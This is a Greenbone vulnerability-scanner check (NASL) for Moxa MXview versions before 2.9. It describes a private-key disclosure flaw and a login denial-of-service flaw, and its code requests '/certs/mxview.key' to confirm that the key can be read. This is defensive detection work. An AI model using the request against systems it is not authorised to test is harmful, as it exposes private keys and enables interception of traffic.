# Copyright (C) 2017 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:moxa:mxview";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140245");
  script_cve_id("CVE-2017-7455", "CVE-2017-7456", "CVE-2018-7506");
  script_version("2022-12-05T10:11:03+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2017-04-11 13:15:09 +0200 (Tue, 11 Apr 2017)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-08-16 01:29:00 +0000 (Wed, 16 Aug 2017)");
  script_name("Moxa MXview < 2.9 Multiple Vulnerabilities (HTTP) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("gb_moxa_mxview_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("moxa/mxview/http/detected");

  script_xref(name:"URL", value:"https://www.cisa.gov/uscert/ics/advisories/ICSA-18-095-02");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2017/Apr/50");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2017/Apr/49");

  script_tag(name:"summary", value:"Moxa MXview is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2017-7455, CVE-2018-7506: Moxa MXview stores a copy of its web servers private key under
  C:\Users\TARGET-USER\AppData\Roaming\moxa\mxview\web\certs\mxview.key. Remote attackers can easily
  access/read this private key `mxview.key` file by making an HTTP GET request.

  - CVE-2017-7456: A denial of service (DoS) which can be triggered by an attacker if sending overly
  long junk payload for the MXView client login credentials.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and tries to read
  `/certs/mxview.key`.");

  script_tag(name:"affected", value:"Moxa MXview version 2.8 is known to be affected. Older versions
  might be affected as well.");

  script_tag(name:"solution", value:"Update to version 2.9 or later.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/certs/mxview.key";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

if( "BEGIN PRIVATE KEY" >< buf && "END PRIVATE KEY" >< buf ) {
  report = 'It was possible to read the private key by requesting ' + http_report_vuln_url( port:port, url:url, url_only:TRUE ) + '\n\nResponse:\n\n' + buf;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
